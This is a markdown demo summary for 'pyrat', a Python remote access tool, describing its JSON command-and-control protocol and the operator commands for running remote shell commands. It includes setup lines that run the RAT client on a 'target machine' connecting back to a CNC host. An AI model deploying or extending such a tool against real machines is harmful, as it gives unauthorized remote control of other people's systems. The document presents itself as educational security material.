# pyrat Demonstration Summary

## What Was Demonstrated

The `demo_interactive.py` script successfully demonstrated the pyrat protocol by simulating both a CNC server and a RAT client communicating over TCP.

## Protocol Flow Demonstrated

### 1. Connection Establishment
- **Server** starts listening on port 9002
- **Client** connects to the server
- **Client** sends a `hello` message with system information:
  ```json
  {
    "type": "hello",
    "hostname": "desktop01",
    "cwd": "D:\\Kriss\\Documents\\Git\\code\\Python\\pyrat",
    "platform": "win32",
    "pid": 12345
  }
  ```

### 2. Command Execution Examples

#### Ping Command
- **Server** → **Client**: `{"type": "ping"}`
- **Client** → **Server**: `{"type": "pong"}`

#### Get Current Directory
- **Server** → **Client**: `{"type": "pwd"}`
- **Client** → **Server**: `{"type": "pwd_result", "cwd": "D:\\Kriss\\Documents\\Git\\code\\Python\\pyrat"}`

#### Execute Shell Command
- **Server** → **Client**: `{"type": "exec", "cmd": "echo Hello from RAT!"}`
- **Client** executes the command and responds:
  ```json
  {
    "type": "exec_result",
    "cmd": "echo Hello from RAT!",
    "result": {
      "ok": true,
      "stdout": "Hello from RAT!\n",
      "stderr": "",
      "returncode": 0
    },
    "cwd": "D:\\Kriss\\Documents\\Git\\code\\Python\\pyrat"
  }
  ```

#### Directory Listing (Windows)
- **Server** → **Client**: `{"type": "exec", "cmd": "dir"}`
- **Client** executes `dir` and returns the directory listing in the `stdout` field

### 3. Graceful Shutdown
- **Server** → **Client**: `{"type": "exit"}`
- **Client** → **Server**: `{"type": "bye"}`
- **Client** closes connection

## Key Features Demonstrated

1. **JSON-based Protocol**: All messages are JSON-encoded, newline-delimited
2. **Bidirectional Communication**: Both server and client can send commands/responses
3. **Remote Command Execution**: Server can execute shell commands on the client
4. **System Information**: Client reports hostname, platform, working directory
5. **Graceful Handling**: Proper connection cleanup and exit handling

## Real-World Usage

To use the actual pyrat tools:

1. **Start the CNC server** (in one terminal):
   ```bash
   python cnc_server.py --host 0.0.0.0 --port 9001
   ```

2. **Start the RAT client** (on target machine):
   ```bash
   python rat.py --host <CNC_IP> --port 9001
   ```

3. **Interact via CNC CLI**:
   - `list` - List connected clients
   - `use 1` - Select client #1
   - `pwd` - Get current directory
   - `exec <command>` - Execute a command
   - `ping` - Test connectivity
   - `exit_client` - Disconnect client
   - `quit` - Exit server

## Security Reminder

⚠️ **This tool is for educational purposes only!**
- Only use on systems you own or have explicit permission to test
- Never deploy on production systems or networks
- Understand the security implications before use

